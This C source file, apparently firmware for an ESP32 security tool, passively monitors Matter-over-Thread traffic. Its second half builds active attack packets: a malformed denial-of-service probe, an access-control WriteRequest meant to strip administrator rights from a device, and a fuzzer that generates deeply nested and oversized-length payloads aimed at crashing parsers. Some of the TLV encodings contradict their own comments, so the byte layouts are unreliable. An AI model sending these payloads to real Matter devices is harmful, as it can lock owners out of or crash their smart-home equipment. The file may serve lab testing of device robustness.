/**
 * @file matter_monitor.c
 * @brief Passive Matter-over-Thread monitoring and DeeDoS probe generation.
 */

#include "matter_monitor.h"

#include <inttypes.h>
#include <string.h>
#include "esp_log.h"
#include "frame_parser.h"

static const char *TAG = "matter_monitor";

static matter_monitor_stats_t s_stats;
static matter_session_t       s_sessions[MATTER_MONITOR_MAX_SESSIONS];

static bool lowpan_like(const uint8_t *payload, uint8_t len)
{
    if (payload == NULL || len == 0) {
        return false;
    }

    uint8_t dispatch = payload[0];
    return ((dispatch & 0xE0) == 0x60) ||
           ((dispatch & 0xC0) == 0x80) ||
           ((dispatch & 0xF8) == 0xC0) ||
           ((dispatch & 0xF8) == 0xF0);
}

static int find_udp_header(const uint8_t *payload, uint8_t len, uint16_t port)
{
    if (payload == NULL || len < 8) {
        return -1;
    }

    uint8_t msb = (uint8_t)(port >> 8);
    uint8_t lsb = (uint8_t)(port & 0xFF);
    for (uint8_t i = 0; i + 7 < len; i++) {
        if ((payload[i] == msb && payload[i + 1] == lsb) ||
            (payload[i + 2] == msb && payload[i + 3] == lsb)) {
            return i;
        }
    }

    return -1;
}

static matter_session_t *get_session(uint16_t session_id,
                                     uint16_t src_short,
                                     uint16_t dst_short)
{
    matter_session_t *free_slot = NULL;

    for (size_t i = 0; i < MATTER_MONITOR_MAX_SESSIONS; i++) {
        if (!s_sessions[i].active && free_slot == NULL) {
            free_slot = &s_sessions[i];
            continue;
        }

        if (s_sessions[i].active &&
            s_sessions[i].session_id == session_id &&
            s_sessions[i].source_short_addr == src_short &&
            s_sessions[i].dest_short_addr == dst_short) {
            return &s_sessions[i];
        }
    }

    if (free_slot != NULL) {
        memset(free_slot, 0, sizeof(*free_slot));
        free_slot->active = true;
        free_slot->session_id = session_id;
        free_slot->source_short_addr = src_short;
        free_slot->dest_short_addr = dst_short;
        s_stats.active_sessions++;
        return free_slot;
    }

    return NULL;
}

esp_err_t matter_monitor_start(void)
{
    memset(&s_stats, 0, sizeof(s_stats));
    memset(s_sessions, 0, sizeof(s_sessions));
    s_stats.active = true;
    ESP_LOGI(TAG, "Matter monitor started");
    return ESP_OK;
}

esp_err_t matter_monitor_stop(void)
{
    s_stats.active = false;
    ESP_LOGI(TAG, "Matter monitor stopped (%" PRIu32 " Matter packet(s))",
             s_stats.matter_over_thread_packets);
    return ESP_OK;
}

esp_err_t matter_monitor_get_stats(matter_monitor_stats_t *stats)
{
    if (stats == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    memcpy(stats, &s_stats, sizeof(*stats));
    return ESP_OK;
}

size_t matter_monitor_get_sessions(matter_session_t *sessions, size_t max_sessions)
{
    size_t copied = 0;
    if (sessions == NULL || max_sessions == 0) {
        return 0;
    }

    for (size_t i = 0; i < MATTER_MONITOR_MAX_SESSIONS && copied < max_sessions; i++) {
        if (s_sessions[i].active) {
            sessions[copied++] = s_sessions[i];
        }
    }

    return copied;
}

void matter_monitor_process_packet(const uint8_t *frame,
                                   uint8_t len,
                                   int8_t rssi,
                                   uint8_t channel,
                                   uint32_t timestamp_us)
{
    (void)rssi;

    if (!s_stats.active || frame == NULL || len == 0) {
        return;
    }

    mac_header_t mac;
    if (frame_parse_mac(frame, len, &mac) != ESP_OK || mac.header_len >= len) {
        return;
    }

    const uint8_t *payload = &frame[mac.header_len];
    uint8_t payload_len = len - mac.header_len;
    if (!lowpan_like(payload, payload_len)) {
        return;
    }

    int udp_offset = find_udp_header(payload, payload_len, 0x15A4);
    if (udp_offset < 0 || (udp_offset + 8) >= payload_len) {
        return;
    }

    const uint8_t *matter = &payload[udp_offset + 8];
    uint8_t matter_len = payload_len - (uint8_t)(udp_offset + 8);
    if (matter_len < 8) {
        return;
    }

    uint16_t session_id = (uint16_t)matter[1] | ((uint16_t)matter[2] << 8);
    uint32_t message_counter = (uint32_t)matter[4] |
                               ((uint32_t)matter[5] << 8) |
                               ((uint32_t)matter[6] << 16) |
                               ((uint32_t)matter[7] << 24);
    bool suspicious = (matter_len > 24 && matter[0] == 0x00 && matter[3] == 0x00);

    matter_session_t *session = get_session(session_id, mac.src_short_addr, mac.dst_short_addr);
    if (session == NULL) {
        return;
    }

    session->message_counter = message_counter;
    session->message_count++;
    session->channel = channel;
    session->last_seen_ms = timestamp_us / 1000;
    session->suspicious_deedos_pattern = suspicious;

    s_stats.total_packets++;
    s_stats.matter_over_thread_packets++;
    s_stats.last_channel = channel;
    if (suspicious) {
        s_stats.deedos_candidates++;
        ESP_LOGW(TAG, "Matter DeeDoS-like payload observed sid=0x%04X ch=%u", session_id, channel);
    }
}

esp_err_t matter_monitor_build_deedos_probe(uint8_t *buffer,
                                            size_t buffer_len,
                                            size_t *probe_len)
{
    if (buffer == NULL || probe_len == NULL || buffer_len < MATTER_DEEDOS_PROBE_LEN) {
        return ESP_ERR_INVALID_ARG;
    }

    /* Lab-only malformed Matter Secure Channel payload intended for transport by a caller. */
    static const uint8_t probe[MATTER_DEEDOS_PROBE_LEN] = {
        0x00, 0xFF, 0xFF, 0x00, /* flags + oversized session id sentinel */
        0x01, 0x00, 0x00, 0x00, /* message counter */
        0x15, 0x00, 0x00, 0x00, /* exchange flags/opcode placeholder */
        0xFF, 0xFF, 0xFF, 0xFF, /* intentionally inconsistent lengths */
        0x30, 0x82, 0x7F, 0xFF, /* malformed TLV/container size lead-in */
        0x18, 0x18, 0x18, 0x18,
        0xFF, 0x00, 0xFF, 0x00,
        0xAA, 0x55, 0xAA, 0x55,
    };

    memcpy(buffer, probe, sizeof(probe));
    *probe_len = sizeof(probe);
    return ESP_OK;
}

/* ── Active Matter attacks ───────────────────────────────────────── */

/** Write uint16 little-endian into buffer */
static inline void wr16_le(uint8_t *buf, uint16_t val)
{
    buf[0] = (uint8_t)(val & 0xFF);
    buf[1] = (uint8_t)((val >> 8) & 0xFF);
}

/** Write uint32 little-endian into buffer */
static inline void wr32_le(uint8_t *buf, uint32_t val)
{
    buf[0] = (uint8_t)(val & 0xFF);
    buf[1] = (uint8_t)((val >> 8) & 0xFF);
    buf[2] = (uint8_t)((val >> 16) & 0xFF);
    buf[3] = (uint8_t)((val >> 24) & 0xFF);
}

esp_err_t matter_acl_lockout_test(uint8_t *buffer,
                                  size_t buffer_len,
                                  size_t *probe_len,
                                  uint16_t session_id,
                                  uint32_t msg_counter,
                                  matter_acl_result_t *result)
{
    if (buffer == NULL || probe_len == NULL || result == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(result, 0, sizeof(*result));
    result->target_session_id = session_id;
    result->probe_counter = msg_counter;

    /*
     * Build a Matter IM WriteRequest targeting AccessControl cluster.
     *
     * Matter message format:
     *   Message Header (8 bytes minimum):
     *     Flags (1) | Session ID (2) | Security Flags (1) |
     *     Message Counter (4)
     *   Protocol Header:
     *     Exchange Flags (1) | Opcode (1) | Exchange ID (2) |
     *     Protocol ID (2) | [optional fields]
     *   Payload: IM WriteRequest TLV
     *
     * IM WriteRequest for AccessControl (cluster 0x001F):
     *   Write attribute ACL (attr 0x0000) with a restrictive entry
     *   that removes all administrator access.
     */

    /* Minimum buffer size for our probe */
    const size_t needed = 64;
    if (buffer_len < needed) {
        return ESP_ERR_INVALID_SIZE;
    }

    uint8_t pos = 0;

    /* === Message Header === */
    buffer[pos++] = 0x00;                    /* Flags: no source node */
    wr16_le(&buffer[pos], session_id);       /* Session ID */
    pos += 2;
    buffer[pos++] = 0x00;                    /* Security flags */
    wr32_le(&buffer[pos], msg_counter);      /* Message counter */
    pos += 4;

    /* === Protocol Header (Interaction Model) === */
    buffer[pos++] = 0x05;                    /* Exchange flags: initiator */
    buffer[pos++] = 0x06;                    /* Opcode: WriteRequest (IM) */
    wr16_le(&buffer[pos], 0x0001);           /* Exchange ID */
    pos += 2;
    wr16_le(&buffer[pos], 0x0001);           /* Protocol ID: IM */
    pos += 2;

    /* === IM WriteRequest TLV Payload === */
    /*
     * Simplified Matter TLV encoding for WriteRequest:
     *   StructureBegin
     *     Tag(0): SuppressResponse = false
     *     Tag(1): TimedRequest = false
     *     Tag(2): AttributeDataIBs (list)
     *       StructureBegin
     *         Tag(0): DataVersion (uint32)
     *         Tag(1): Path
     *           StructureBegin
     *             Tag(2): ClusterId = 0x001F (AccessControl)
     *             Tag(3): AttributeId = 0x0000 (ACL)
     *             Tag(1): EndpointId = 0x0000
     *           StructureEnd
     *         Tag(2): Data
     *           ListBegin
     *             StructureBegin (ACL entry)
     *               Tag(1): Privilege = 1 (View only — lockout!)
     *               Tag(2): AuthMode = 2 (CASE)
     *               Tag(3): Subjects = [] (empty — locks everyone)
     *               Tag(4): Targets = null
     *             StructureEnd
     *           ListEnd
     *       StructureEnd
     *   StructureEnd
     */

    /* Matter TLV type tags */
    #define TLV_STRUCT_BEGIN    0x15
    #define TLV_STRUCT_END      0x18
    #define TLV_LIST_BEGIN      0x17
    #define TLV_LIST_END        0x18
    #define TLV_BOOL_FALSE      0x08
    #define TLV_UINT8_TAG(t)    (0x20 | ((t) & 0x07))
    #define TLV_UINT16_TAG(t)   (0x24 | ((t) & 0x07))
    #define TLV_UINT32_TAG(t)   (0x24 | ((t) & 0x07))

    /* WriteRequest structure begin */
    buffer[pos++] = TLV_STRUCT_BEGIN;

    /* SuppressResponse = false */
    buffer[pos++] = 0x28; /* Context tag 0, Boolean False */
    buffer[pos++] = 0x00;

    /* TimedRequest = false */
    buffer[pos++] = 0x29; /* Context tag 1, Boolean False */
    buffer[pos++] = 0x00;

    /* AttributeDataIBs list begin (tag 2) */
    buffer[pos++] = 0x36; /* Context tag 2, Array/List */
    buffer[pos++] = TLV_STRUCT_BEGIN;

    /* DataVersion */
    buffer[pos++] = 0x24; /* Context tag 0, uint16 */
    wr16_le(&buffer[pos], 0x0001);
    pos += 2;

    /* Path structure (tag 1) */
    buffer[pos++] = 0x37; /* Context tag 1, Structure */
    buffer[pos++] = TLV_STRUCT_BEGIN;

    /* EndpointId = 0 (tag 1) */
    buffer[pos++] = 0x24; /* Context tag 1, uint16 */
    wr16_le(&buffer[pos], 0x0000);
    pos += 2;

    /* ClusterId = 0x001F AccessControl (tag 2) */
    buffer[pos++] = 0x24; /* Context tag 2, uint16 */
    wr16_le(&buffer[pos], 0x001F);
    pos += 2;

    /* AttributeId = 0x0000 ACL (tag 3) */
    buffer[pos++] = 0x24; /* Context tag 3, uint16 */
    wr16_le(&buffer[pos], 0x0000);
    pos += 2;

    buffer[pos++] = TLV_STRUCT_END; /* End Path */

    /* Data: restrictive ACL entry (tag 2) */
    buffer[pos++] = 0x36; /* Context tag 2, List */
    buffer[pos++] = TLV_STRUCT_BEGIN;

    /* Privilege = 1 (View only — this is the lockout) */
    buffer[pos++] = 0x20; /* Context tag 1, uint8 */
    buffer[pos++] = 0x01;

    /* AuthMode = 2 (CASE) */
    buffer[pos++] = 0x20; /* Context tag 2, uint8 */
    buffer[pos++] = 0x02;

    /* Empty subjects (tag 3) */
    buffer[pos++] = 0x36; /* Context tag 3, List */
    buffer[pos++] = TLV_LIST_END;

    buffer[pos++] = TLV_STRUCT_END; /* End ACL entry */
    buffer[pos++] = TLV_LIST_END;   /* End Data list */

    buffer[pos++] = TLV_STRUCT_END; /* End AttributeDataIB */
    buffer[pos++] = TLV_LIST_END;   /* End AttributeDataIBs */

    buffer[pos++] = TLV_STRUCT_END; /* End WriteRequest */

    *probe_len = pos;

    ESP_LOGW(TAG, "ACL lockout probe built: %d bytes, session=0x%04X, "
             "counter=%"PRIu32, pos, session_id, msg_counter);
    return ESP_OK;
}

/**
 * Simple PRNG for fuzzing (xorshift32).
 */
static uint32_t xorshift32(uint32_t *state)
{
    uint32_t x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

esp_err_t matter_fuzzer(matter_fuzz_case_t *fuzz_case,
                        uint8_t fuzz_type,
                        uint16_t session_id,
                        uint32_t msg_counter,
                        uint32_t seed)
{
    if (fuzz_case == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(fuzz_case, 0, sizeof(*fuzz_case));
    fuzz_case->fuzz_type = fuzz_type;
    fuzz_case->target_session_id = session_id;
    fuzz_case->message_counter = msg_counter;

    uint32_t rng = (seed != 0) ? seed : 0xDEADBEEF;
    uint8_t *p = fuzz_case->payload;
    uint8_t pos = 0;

    /* Message header (always valid so it reaches the parser) */
    p[pos++] = 0x00;                          /* Flags */
    p[pos++] = (uint8_t)(session_id & 0xFF);  /* Session ID low */
    p[pos++] = (uint8_t)(session_id >> 8);     /* Session ID high */
    p[pos++] = 0x00;                          /* Security flags */
    wr32_le(&p[pos], msg_counter);
    pos += 4;

    switch (fuzz_type) {
    case 0: /* Random TLV payload */
        ESP_LOGI(TAG, "Fuzz type 0: random TLV payload");
        /* Valid exchange header */
        p[pos++] = 0x05;  /* Exchange flags */
        p[pos++] = 0x01;  /* Opcode: StatusResponse */
        p[pos++] = 0x01;  /* Exchange ID low */
        p[pos++] = 0x00;  /* Exchange ID high */
        p[pos++] = 0x00;  /* Protocol ID low (SecureChannel) */
        p[pos++] = 0x00;  /* Protocol ID high */

        /* Random TLV bytes */
        while (pos < MATTER_FUZZ_MAX_LEN - 4) {
            p[pos++] = (uint8_t)(xorshift32(&rng) & 0xFF);
        }
        break;

    case 1: /* Boundary values */
        ESP_LOGI(TAG, "Fuzz type 1: boundary value TLV");
        p[pos++] = 0x05;
        p[pos++] = 0x06;  /* WriteRequest opcode */
        p[pos++] = 0x01;
        p[pos++] = 0x00;
        p[pos++] = 0x01;  /* IM protocol */
        p[pos++] = 0x00;

        /* TLV with boundary values */
        p[pos++] = 0x15;  /* Structure begin */

        /* uint8 = 0 */
        p[pos++] = 0x20;
        p[pos++] = 0x00;

        /* uint8 = 0xFF */
        p[pos++] = 0x20;
        p[pos++] = 0xFF;

        /* uint16 = 0xFFFF */
        p[pos++] = 0x24;
        p[pos++] = 0xFF;
        p[pos++] = 0xFF;

        /* uint32 = 0xFFFFFFFF */
        p[pos++] = 0x26;
        p[pos++] = 0xFF;
        p[pos++] = 0xFF;
        p[pos++] = 0xFF;
        p[pos++] = 0xFF;

        /* UTF8 string with length 0xFF (oversized claim) */
        p[pos++] = 0x0C; /* UTF8 1-byte length tag */
        p[pos++] = 0xFF; /* Claimed length: 255 */
        /* Don't actually provide 255 bytes — tests length validation */
        p[pos++] = 'A';
        p[pos++] = 0x00;

        p[pos++] = 0x18; /* Structure end */
        break;

    case 2: /* Overflow / malformed containers */
        ESP_LOGI(TAG, "Fuzz type 2: overflow TLV containers");
        p[pos++] = 0x05;
        p[pos++] = 0x08;  /* InvokeRequest opcode */
        p[pos++] = 0x01;
        p[pos++] = 0x00;
        p[pos++] = 0x01;  /* IM protocol */
        p[pos++] = 0x00;

        /* Deeply nested structures (stack overflow attempt) */
        for (uint8_t depth = 0; depth < 20 && pos < MATTER_FUZZ_MAX_LEN - 2; depth++) {
            p[pos++] = 0x15; /* Structure begin */
        }

        /* Byte string with impossibly large length */
        p[pos++] = 0x10; /* Byte string, 1-byte length */
        p[pos++] = 0xFE; /* Claimed: 254 bytes */

        /* Fill remaining with pattern */
        while (pos < MATTER_FUZZ_MAX_LEN - 1) {
            p[pos++] = 0xAA;
        }

        /* No matching structure-end tags — tests parser robustness */
        break;

    default:
        ESP_LOGE(TAG, "Unknown fuzz type: %d", fuzz_type);
        return ESP_ERR_INVALID_ARG;
    }

    fuzz_case->payload_len = pos;

    ESP_LOGI(TAG, "Fuzz case built: type=%d, %d bytes, session=0x%04X",
             fuzz_type, pos, session_id);
    return ESP_OK;
}
